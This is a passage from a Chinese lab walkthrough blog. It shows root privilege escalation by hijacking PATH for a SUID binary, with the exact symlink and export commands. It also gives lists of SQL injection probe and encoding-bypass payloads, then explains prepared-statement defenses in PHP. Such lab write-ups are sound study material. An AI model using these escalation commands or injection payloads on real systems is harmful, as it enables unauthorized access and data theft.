+<li><code>/proc</code> 是虚拟文件系统，包含进程信息</li>
+<li><strong>其中的”文件”不是真正的磁盘文件</strong></li>
+<li><strong>访问某些&#x2F;proc 文件可能导致系统信息泄露</strong></li>
+<li><strong>排除它可以减少噪音和误报</strong></li>
+</ul>
+</blockquote>
+<p><strong>接下来就是看两张表中的可执行文件哪个能提权</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921631.png" alt="image-20251223205803163"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921632.png" alt="image-20251223205900429"></p>
+<p>**首先我们注意到 **<code>bash_history</code> 这个文件，可以看到执行了如下命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921633.png" alt="image-20251223210745775"></p>
+<p><strong>其中的</strong><code>procwatch</code> 我们是有执行权限的，而且所在目录 <code>backup</code> 本来就是重点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921635.png" alt="image-20251223210915204"></p>
+<p>**这里无法清屏，可以给他指定环境变量 **<code>export TERM=xterm-color</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921636.png" alt="image-20251223211044589"></p>
+<p><code>procwatch</code> 有 <code>s</code> 位</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921637.png" alt="image-20251223211214784"></p>
+<p><strong>执行该文件时</strong>	<code>sh</code> 可能是 <code>bash</code>	<code>ps</code> 可能是 <code>系统命令-查看进程</code></p>
+<blockquote>
+<p><strong>[!CAUTION]</strong></p>
+<p><strong>这里的 <code>sh</code> 和 <code>ps</code> 都没有指定绝地路径，并且具有 SUID 位，这两点是提权成功的关键！！！！</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921638.png" alt="image-20251223211510949"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ps    #软链接把想执行的东西写入 ps </span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">./procwatch</span><br><span class="line"></span><br><span class="line">#想写脚本的话用 bash -p 成功率更高</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921639.png" alt="image-20251223211602769"></p>
+<p><strong>提权成功</strong></p>
+<h3 id="定妆照"><a href="#定妆照" class="headerlink" title="定妆照"></a><strong>定妆照</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320150921640.png" alt="image-20251223213052986"></p>
+<details><summary>提权过程</summary>
+
+</details>
+
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><h3 id="sql-注入的不同注释符"><a href="#sql-注入的不同注释符" class="headerlink" title="sql 注入的不同注释符"></a>sql 注入的不同注释符</h3><table>
+<thead>
+<tr>
+<th><strong>单行注释</strong></th>
+<th><strong>多行注释</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>#</code> <code>--</code>（后面必须有空格）<code>--+</code>（URL 编码中的空格）</td>
+<td><code>/* */</code></td>
+<td><strong>最常用</strong><code>#</code> 和 <code>--+</code></td>
+</tr>
+</tbody></table>
+<h3 id="version-的不同查询方式"><a href="#version-的不同查询方式" class="headerlink" title="version 的不同查询方式"></a>version 的不同查询方式</h3><table>
+<thead>
+<tr>
+<th><strong>数据库</strong></th>
+<th><strong>版本查询方法</strong></th>
+<th><strong>示例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>MySQL</strong></td>
+<td><code>version()</code> <code>@@version</code></td>
+<td><code>SELECT version();</code> <code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td><strong>SQL Server</strong></td>
+<td><code>@@version</code></td>
+<td><code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td><strong>Oracle</strong></td>
+<td><code>SELECT banner FROM v$version</code></td>
+<td><code>SELECT banner FROM v$version;</code></td>
+</tr>
+<tr>
+<td><strong>PostgreSQL</strong></td>
+<td><code>version()</code></td>
+<td><code>SELECT version();</code></td>
+</tr>
+<tr>
+<td><strong>SQLite</strong></td>
+<td><code>sqlite_version()</code></td>
+<td><code>SELECT sqlite_version();</code></td>
+</tr>
+</tbody></table>
+<h3 id="PATH-劫持"><a href="#PATH-劫持" class="headerlink" title="PATH 劫持"></a>PATH 劫持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 原始PATH</span><br><span class="line">echo $PATH</span><br><span class="line"># /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line"># 修改后的PATH</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line"># .:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line"># ↑ 当前目录优先！</span><br></pre></td></tr></table></figure>
+
+<h3 id="重要思路"><a href="#重要思路" class="headerlink" title="重要思路"></a>重要思路</h3><p><strong>1.图片信息一定要看！用 <code>exiftool</code> 工具</strong>—发现特殊目录(几户无法被爆破)</p>
+<p><strong>##</strong></p>
+<p><strong>2.<code>hydra</code> 表单暴力破解</strong></p>
+<p><strong>##</strong></p>
+<p><strong>3.sql 注入可能的截断符号</strong>–这里使用双引号 <code>&quot;</code></p>
+<p><strong>通用测试序列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;           -- 测试单引号</span><br><span class="line">&quot;           -- 测试双引号</span><br><span class="line">`           -- 测试反引号（MySQL）</span><br><span class="line">&#x27;)          -- 测试括号+单引号</span><br><span class="line">&quot;)          -- 测试括号+双引号</span><br><span class="line">&#x27;))         -- 测试多层括号</span><br><span class="line">&#x27; OR 1=1 -- </span><br><span class="line">&quot; OR 1=1 -- </span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">&quot; OR &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><strong>编码绕过版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%27         -- URL编码的单引号 &#x27;</span><br><span class="line">%22         -- URL编码的双引号 &quot;</span><br><span class="line">%60         -- URL编码的反引号 `</span><br><span class="line">%2527       -- 双重URL编码的单引号</span><br><span class="line">%00         -- 空字节（有时可截断）</span><br><span class="line">%0A         -- 换行符</span><br><span class="line">%0D         -- 回车符</span><br></pre></td></tr></table></figure>
+
+<p><strong>##</strong></p>
+<p><strong>4.SQL 注入方式</strong></p>
+<p><strong>一般</strong>	<strong>小马–一句话木马</strong>	<strong>大马–反弹 shell</strong>	<code>sqlmap</code> 自动化</p>
+<h1 id="彻底的-sql-防范，预处理-参数绑定"><a href="#彻底的-sql-防范，预处理-参数绑定" class="headerlink" title="彻底的 sql 防范，预处理 + 参数绑定"></a><strong>彻底的 sql 防范，预处理 + 参数绑定</strong></h1><p><strong>预处理语句 + 参数绑定能防范 SQL 注入，核心是将 “SQL 逻辑” 和 “用户输入数据” 完全分离，让数据库明确区分 “语法指令” 和 “普通数据”，从根源上避免用户输入被当作 SQL 代码执行，具体原理分 3 步解析：</strong></p>
+<h3 id="1-预处理阶段：先发送-“SQL-模板”，固定执行逻辑"><a href="#1-预处理阶段：先发送-“SQL-模板”，固定执行逻辑" class="headerlink" title="1. 预处理阶段：先发送 “SQL 模板”，固定执行逻辑"></a><strong>1. 预处理阶段：先发送 “SQL 模板”，固定执行逻辑</strong></h3><p><strong>使用预处理语句时，第一步是向数据库发送包含占位符（如 <code>?</code>）的 SQL 模板，数据库会先解析这个模板，确定 SQL 的执行逻辑（表、字段、条件结构），但不执行具体查询：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 预处理模板（占位符?代表后续要传入的数据）</span><br><span class="line">select * from auth where pass = ? and uname = ?</span><br></pre></td></tr></table></figure>
+
+<p><strong>此时数据库已经明确：这条 SQL 的逻辑是 “从 auth 表查 pass 和 uname 匹配的记录”，后续传入的内容只会被当作 “pass&#x2F;uname 的具体值”，不会改变 SQL 的结构。</strong></p>
+<h3 id="2-参数绑定阶段：数据以-“纯值”-传递，不参与-SQL-解析"><a href="#2-参数绑定阶段：数据以-“纯值”-传递，不参与-SQL-解析" class="headerlink" title="2. 参数绑定阶段：数据以 “纯值” 传递，不参与 SQL 解析"></a><strong>2. 参数绑定阶段：数据以 “纯值” 传递，不参与 SQL 解析</strong></h3><p><strong>参数绑定是将用户输入作为 “原始数据” 传递给数据库，而不是拼接到 SQL 语句中。关键区别：</strong></p>
+<ul>
+<li><strong>传统拼接：用户输入会被直接嵌入 SQL 字符串，数据库会把输入内容当作 SQL 代码的一部分解析（比如注入的 <code>&#39; OR &#39;1&#39;=&#39;1</code> 会被当作条件逻辑）；</strong></li>
+<li><strong>参数绑定：用户输入会被数据库当作 “二进制 &#x2F; 字符串数据” 处理，不会参与 SQL 的语法解析—— 即使输入包含 <code>&#39;</code>、<code>OR</code> 等字符，数据库也只会把它当作 “pass&#x2F;uname 字段的普通值”，而不是 SQL 指令。</strong></li>
+</ul>
+<h3 id="3-执行阶段：用绑定的数据填充模板，数据不会被执行"><a href="#3-执行阶段：用绑定的数据填充模板，数据不会被执行" class="headerlink" title="3. 执行阶段：用绑定的数据填充模板，数据不会被执行"></a><strong>3. 执行阶段：用绑定的数据填充模板，数据不会被执行</strong></h3><p><strong>当参数绑定完成后，数据库会用绑定的 “纯数据” 填充预处理模板的占位符，执行查询。此时：</strong></p>
+<ul>
+<li><strong>注入内容（如 <code>&#39; OR &#39;1&#39;=&#39;1</code>）会被当作普通字符串存储在数据库的 “数据缓冲区” 中，而不是被解析为 SQL 语法；</strong></li>
+<li><strong>数据库会严格按照预处理阶段确定的逻辑执行（只匹配 pass&#x2F;uname 的具体值），不会执行用户输入中的 “恶意 SQL 片段”。</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&#x27;login&#x27;])) &#123;</span><br><span class="line">    // 1. 获取用户输入（无需urldecode，PHP自动处理）</span><br><span class="line">    $uname = $_POST[&#x27;un&#x27;];</span><br><span class="line">    $pass = $_POST[&#x27;ps&#x27;];</span><br><span class="line"></span><br><span class="line">    // 2. 准备预处理语句（?是参数占位符，避免拼接）</span><br><span class="line">    $sql = &quot;select * from auth where pass = ? and uname = ?&quot;;</span><br><span class="line">    $stmt = mysqli_prepare($conn, $sql);</span><br><span class="line"></span><br><span class="line">    // 3. 绑定参数（s表示字符串类型，按顺序绑定pass和uname）</span><br><span class="line">    mysqli_stmt_bind_param($stmt, &quot;ss&quot;, $pass, $uname);</span><br><span class="line"></span><br><span class="line">    // 4. 执行查询</span><br><span class="line">    mysqli_stmt_execute($stmt);</span><br><span class="line"></span><br><span class="line">    // 5. 获取结果</span><br><span class="line">    $result = mysqli_stmt_get_result($stmt);</span><br><span class="line">    if (mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line">        // 登录成功逻辑</span><br><span class="line">        echo &quot;登录成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 登录失败逻辑</span><br><span class="line">        echo &quot;账号/密码错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 关闭语句和连接</span><br><span class="line">    mysqli_stmt_close($stmt);</span><br><span class="line">    mysqli_close($conn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="CSRF-XSS-组合拳实战-CSDN-博客"><a href="#CSRF-XSS-组合拳实战-CSDN-博客" class="headerlink" title="CSRF+XSS 组合拳实战-CSDN 博客"></a><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46367450/article/details/132545171">CSRF+XSS 组合拳实战-CSDN 博客</a></strong></h1>
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/03/20/靶机精炼-思路为王（四）/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Billu-b0x-%E5%A4%A7%E7%BB%83%E5%85%B5%EF%BC%8C%E6%B6%89%E5%8F%8A-SQL-%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E3%80%82"><span class="toc-number">1.</span> <span class="toc-text">Billu b0x - 大练兵，涉及 SQL 注入，文件包含，代码审计和图片木马，细节满满。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.1.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80-%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.2.</span> <span class="toc-text">80 页面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text">图片捆绑木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90-shell"><span class="toc-number">1.5.</span> <span class="toc-text">获得初始系统权限 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">phpmyadmin 配置文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E3%80%8C%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E3%80%8D%EF%BC%88%E5%8D%B1%E9%99%A9%EF%BC%8C%E4%B8%8D%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">配置文件中的「免密登录密码」（危险，不推荐）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">内核提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">1.8.1.</span> <span class="toc-text">思维导图</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kioptrix1-2-LotusCMS-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%8C%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%EF%BC%8Cmysql-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%8C%E4%BD%BF%E7%94%A8-john-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-md5-%E5%93%88%E5%B8%8C"><span class="toc-number">2.</span> <span class="toc-text">Kioptrix1.2 - LotusCMS 公开漏洞利用，配置文件敏感信息枚举，mysql 数据库信息搜集，使用 john 暴力破解 md5 哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E6%B8%97%E9%80%8F-1"><span class="toc-number">2.2.</span> <span class="toc-text">web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%9D%E8%AF%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">文件包含尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-Lotus-CMS-%E7%9A%84%E6%B3%84%E6%BC%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">内容管理系统 Lotus CMS 的泄漏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lotus-CMS-%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">Lotus CMS 的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E9%AB%98-shell-%E4%BA%A4%E4%BA%92%E6%80%A7%EF%BC%8Cpython-%E5%92%8C-TERM-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">提高 shell 交互性，python 和 TERM 环境变量设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%89%BE%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">2.3.2.</span> <span class="toc-text">配置文件找登录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%BB%84%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%BD%95-gallery"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">第一组可以登录 gallery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%AC%AC%E4%BA%8C%E7%BB%84%E5%AF%86%E7%A0%81-hash"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">爆破第二组密码 hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81%EF%BC%8C%E8%8E%B7%E5%BE%97%E5%88%9D%E6%AD%A5%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">配置文件泄漏数据库密码，获得初步提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97-root-%E6%9D%83%E9%99%90"><span class="toc-number">2.5.</span> <span class="toc-text">获得 root 权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE-1"><span class="toc-number">2.6.1.</span> <span class="toc-text">思维导图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat-%E5%8D%B3-nc"><span class="toc-number">2.6.2.</span> <span class="toc-text">NetCat 即 nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81NetCat-e%EF%BC%88%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8F%8D%E5%90%91-%E6%AD%A3%E5%90%91-Shell-%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-number">2.6.3.</span> <span class="toc-text">一、NetCat -e（执行命令，反向 &#x2F; 正向 Shell 核心）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%9C%E7%94%A8"><span class="toc-number">2.6.3.1.</span> <span class="toc-text">1. 作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%AF%AD%E6%B3%95%E4%B8%8E%E5%9C%BA%E6%99%AF"><span class="toc-number">2.6.3.2.</span> <span class="toc-text">2. 语法与场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">2.6.3.3.</span> <span class="toc-text">3. 关键说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81NetCat-dev-tcp%EF%BC%88%E4%BC%AA%E8%AE%BE%E5%A4%87%EF%BC%8C%E6%97%A0-nc-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%97%B6%E7%9A%84%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-number">2.6.4.</span> <span class="toc-text">二、NetCat &#x2F;dev&#x2F;tcp（伪设备，无 nc 二进制时的替代方案）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%9C%E7%94%A8-1"><span class="toc-number">2.6.4.1.</span> <span class="toc-text">1. 作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86"><span class="toc-number">2.6.4.2.</span> <span class="toc-text">2. 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B8%E5%9E%8B%E7%94%A8%E6%B3%95%EF%BC%88%E5%8F%8D%E5%90%91-Shell%EF%BC%89"><span class="toc-number">2.6.4.3.</span> <span class="toc-text">3. 典型用法（反向 Shell）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E8%AF%B4%E6%98%8E"><span class="toc-number">2.6.4.4.</span> <span class="toc-text">4. 关键说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81NetCat-Backpipe%EF%BC%88%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%EF%BC%8C%E7%BB%95%E8%BF%87-e-%E7%A6%81%E7%94%A8%EF%BC%89"><span class="toc-number">2.6.5.</span> <span class="toc-text">三、NetCat Backpipe（命名管道，绕过 - e 禁用）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%9C%E7%94%A8-2"><span class="toc-number">2.6.5.1.</span> <span class="toc-text">1. 作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.6.5.2.</span> <span class="toc-text">2. 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B8%E5%9E%8B%E7%94%A8%E6%B3%95%EF%BC%88%E5%8F%8D%E5%90%91-Shell%EF%BC%89-1"><span class="toc-number">2.6.5.3.</span> <span class="toc-text">3. 典型用法（反向 Shell）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E8%AF%B4%E6%98%8E-1"><span class="toc-number">2.6.5.4.</span> <span class="toc-text">4. 关键说明</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81NetCat-FIFO%EF%BC%88%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%EF%BC%8C%E4%B8%8E-Backpipe-%E7%AD%89%E4%BB%B7%EF%BC%89"><span class="toc-number">2.6.6.</span> <span class="toc-text">四、NetCat FIFO（命名管道，与 Backpipe 等价）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AE%9A%E4%B9%89"><span class="toc-number">2.6.6.1.</span> <span class="toc-text">1. 定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB%EF%BC%88FIFO-vs-%E5%8C%BF%E5%90%8D%E7%AE%A1%E9%81%93%EF%BC%89"><span class="toc-number">2.6.6.2.</span> <span class="toc-text">2. 核心区别（FIFO vs 匿名管道）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%89%A9%E5%B1%95%E7%94%A8%E6%B3%95%EF%BC%88%E6%AD%A3%E5%90%91-Shell%EF%BC%89"><span class="toc-number">2.6.6.3.</span> <span class="toc-text">3. 扩展用法（正向 Shell）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%A0%B8%E5%BF%83%E6%80%BB%E7%BB%93%EF%BC%88%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%EF%BC%89"><span class="toc-number">2.6.7.</span> <span class="toc-text">五、核心总结（红队视角）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BNE0x03Simple-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">BNE0x03Simple - 内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F-2"><span class="toc-number">3.1.</span> <span class="toc-text">nmap 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-%E6%B8%97%E9%80%8F"><span class="toc-number">3.2.</span> <span class="toc-text">Web 渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CuteNews-CMS-%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">CuteNews CMS 的漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell"><span class="toc-number">3.4.</span> <span class="toc-text">获得初始 shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="toc-number">3.5.</span> <span class="toc-text">内核提权的尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#37292-c"><span class="toc-number">3.5.1.</span> <span class="toc-text">37292.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E4%B8%80%E4%B8%8B-linpeas-sh-%E7%9A%84%E5%BB%BA%E8%AE%AE"><span class="toc-number">3.5.2.</span> <span class="toc-text">看一下 linpeas.sh 的建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apport-AbrtApport-Abrt-%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F"><span 